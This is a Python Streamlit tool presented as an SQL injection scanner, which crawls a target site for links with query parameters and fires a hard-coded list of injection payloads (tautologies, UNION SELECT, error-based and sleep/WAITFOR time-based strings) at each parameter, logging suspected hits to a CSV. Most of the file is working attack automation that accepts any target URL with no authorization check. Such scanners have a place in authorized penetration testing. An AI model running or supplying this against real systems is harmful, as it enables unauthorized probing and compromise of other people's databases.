import requests
import time
import csv
import re
import streamlit as st
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

HEADERS = {"User-Agent": "Mozilla/5.0"}
USE_BURP = False  
PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"} if USE_BURP else None

PAYLOADS = [
    "' OR '1'='1' --", "' UNION SELECT null, null --", "' AND 1=CONVERT(int, 'a') --",
    "' AND 1=1 --", "' AND 1=2 --", "'; SELECT sleep(5) --", "'; WAITFOR DELAY '0:0:5' --"
]

SQL_ERRORS = [
    "You have an error in your SQL syntax", "Warning: mysql_fetch_assoc()", "SQLSTATE[42000]",
    "Unknown column", "MySQL server version", "PG::SyntaxError"
]

def crawl_website(url):
    found_urls = set()
    try:
        response = requests.get(url, headers=HEADERS, proxies=PROXIES)
        soup = BeautifulSoup(response.text, "html.parser")
        for link in soup.find_all("a", href=True):
            href = urljoin(url, link["href"])
            parsed_href = urlparse(href)
            if parsed_href.query:
                found_urls.add(href)
    except requests.exceptions.RequestException as e:
        st.error(f"Error crawling {url}: {e}")
    return found_urls

def test_sql_injection(url):
    results = []
    for payload in PAYLOADS:
        parsed_url = urlparse(url)
        query_params = parsed_url.query.split("&")
        test_urls = [url.replace(f"{key}={value}", f"{key}={payload}") for param in query_params if "=" in param for key, value in [param.split("=")]]
        
        for test_url in test_urls:
            start_time = time.time()
            try:
                response = requests.get(test_url, headers=HEADERS, proxies=PROXIES)
                response_time = time.time() - start_time
                
                if any(error in response.text for error in SQL_ERRORS):
                    results.append(["Error-Based", test_url, payload])
                if response_time > 4:
                    results.append(["Time-Based", test_url, payload])
                if len(response.text) < 20:
                    results.append(["Anomalous Response", test_url, payload])
            except requests.exceptions.RequestException:
                pass
    return results

def main():
    st.title("SQL Injection Scanner")
    target_url = st.text_input("Enter Target URL", "https://example.com")
    if st.button("Start Scan"):
        st.write("Crawling website...")
        found_links = crawl_website(target_url)
        if not found_links:
            st.warning("No links with query parameters found.")
            return
        st.write(f"Testing {len(found_links)} links for SQL Injection...")
        results = []
        for link in found_links:
            results.extend(test_sql_injection(link))
        
        if results:
            st.write("### SQL Injection Vulnerabilities Found")
            st.table(results)
            with open("sql_injection_results.csv", "w", newline="") as file:
                writer = csv.writer(file)
                writer.writerow(["Type", "URL", "Payload"])
                writer.writerows(results)
            st.success("Results saved to sql_injection_results.csv")
        else:
            st.success("No SQL Injection vulnerabilities found.")

if __name__ == "__main__":
    main()
